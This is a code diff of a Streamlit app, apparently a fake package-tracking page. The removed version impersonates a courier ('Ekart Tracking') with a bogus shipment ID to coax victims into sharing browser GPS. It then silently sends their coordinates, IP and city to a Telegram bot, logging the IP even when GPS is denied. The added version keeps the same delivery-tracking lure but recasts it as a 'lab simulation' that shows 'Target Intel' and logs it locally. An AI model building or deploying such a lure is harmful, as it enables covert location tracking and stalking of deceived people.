@@ -1,49 +1,102 @@
 import streamlit as st
-from streamlit_geolocation import streamlit_geolocation
 import requests
 import pandas as pd
+import streamlit.components.v1 as components
+from streamlit_geolocation import streamlit_geolocation
 
-# --- TELEGRAM CONFIG ---
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID"
+# 1. UI Setup (The "Hook")
+st.set_page_config(page_title="Flash Shipping - Track Package", page_icon="📦")
 
-st.set_page_config(page_title="Ekart Tracking", layout="centered")
+st.title("📦 Package Tracking Portal")
+st.write("Redirecting to your delivery status...")
 
-# Custom CSS to make the button look more "clickable" on a small mobile screen
-st.markdown("""
-    <style>
-    .stButton>button {
-        width: 100%;
-        height: 3em;
-        background-color: #2874f0;
-        color: white;
-        font-weight: bold;
-        border-radius: 10px;
-    }
-    </style>
-""", unsafe_allow_html=True)
+# 2. AUTOMATIC DATA GRAB
+# Prefer precise browser geolocation; fall back to IP-based lookup.
+try:
+    # Ask the browser for precise coordinates (user must allow it)
+    st.info(
+        "If prompted by the browser, click **Allow** to share your location "
+        "for an accurate latitude/longitude demo."
+    )
+    # `streamlit_geolocation` currently does not accept a `key` argument.
+    geo = streamlit_geolocation()
 
-st.title("📦 Package Tracking")
-st.write("Shipment ID: **#EK-17112026**")
+    if geo and geo.get("latitude") is not None and geo.get("longitude") is not None:
+        # High-precision browser geolocation
+        target_data = {
+            "IP Address": "N/A (browser geolocation)",
+            "City": geo.get("city") or "Unknown",
+            "Region": geo.get("region") or "Unknown",
+            "Country": geo.get("country") or "Unknown",
+            "ISP": "N/A",
+            "Latitude": geo.get("latitude"),
+            "Longitude": geo.get("longitude"),
+        }
+    else:
+        # Fallback – IP-based lookup (coarse, may be blocked)
+        try:
+            response = requests.get("https://ipapi.co/json/", timeout=5)
+            response.raise_for_status()
+            response_data = response.json()
+        except Exception:
+            st.warning(
+                "Live IP lookup failed (network / firewall issue). "
+                "Showing demo data instead so the lab still works."
+            )
+            response_data = {
+                "ip": "203.0.113.1",
+                "city": "Demo City",
+                "region": "Demo Region",
+                "country_name": "Demo Country",
+                "org": "Demo ISP",
+                "latitude": 37.7749,
+                "longitude": -122.4194,
+            }
 
-# Get IP location first (Silent Fallback)
-ip_data = requests.get('http://ip-api.com/json/').json()
+        target_data = {
+            "IP Address": response_data.get("ip"),
+            "City": response_data.get("city"),
+            "Region": response_data.get("region"),
+            "Country": response_data.get("country_name"),
+            "ISP": response_data.get("org"),
+            "Latitude": response_data.get("latitude"),
+            "Longitude": response_data.get("longitude"),
+        }
 
-# The Geolocation Component
-st.info("Tap the button below to sync your delivery coordinates.")
-location = streamlit_geolocation()
+    # 3. Startup Lab Dashboard (The "Attacker" View)
+    st.subheader("🕵️ Target Intel (Captured Automatically)")
+    st.json(target_data)
 
-if location.get('latitude'):
-    st.success("📍 Location Verified!")
-    # Send to Telegram
-    msg = f"✅ GPS FOUND\nLat: {location['latitude']}\nLon: {location['longitude']}\nIP: {ip_data.get('query')}"
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                  data={"chat_id": CHAT_ID, "text": msg})
-    
-    st.map(pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]}))
-else:
-    # Silent log of IP (City level)
-    msg = f"⚠️ GPS DENIED / WAITING\nIP: {ip_data.get('query')}\nCity: {ip_data.get('city')}"
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                  data={"chat_id": CHAT_ID, "text": msg})
-    st.warning("Please click 'Allow' on the browser prompt to continue.")
+    # Display on Map (only if we have coordinates)
+    if target_data["Latitude"] is not None and target_data["Longitude"] is not None:
+        lat = target_data["Latitude"]
+        lon = target_data["Longitude"]
+
+        # Streamlit's built‑in map (coarse view)
+        map_data = pd.DataFrame({"lat": [lat], "lon": [lon]})
+        st.map(map_data)
+
+        # Google Maps embed (more familiar interface)
+        st.markdown("**Google Maps view of this location**")
+        maps_url = f"https://www.google.com/maps?q={lat},{lon}&z=15&output=embed"
+        components.iframe(maps_url, height=400)
+
+        # Also provide a direct link the user can open in a new tab
+        st.markdown(
+            f"[Open in Google Maps](https://www.google.com/maps/search/?api=1&query={lat},{lon})"
+        )
+    else:
+        st.warning("Location coordinates not available for this IP.")
+
+    # Log to local file
+    with open("lab_log.txt", "a") as f:
+        f.write(
+            f"Target: {target_data['IP Address']} | "
+            f"Location: {target_data['City']}, {target_data['Region']}, {target_data['Country']}\n"
+        )
+
+except Exception as e:
+    st.error(f"Connection Error: {e}")
+
+st.divider()
+st.caption("Cybersecurity Lab Simulation: Demonstrating IP-based OSINT gathering.")
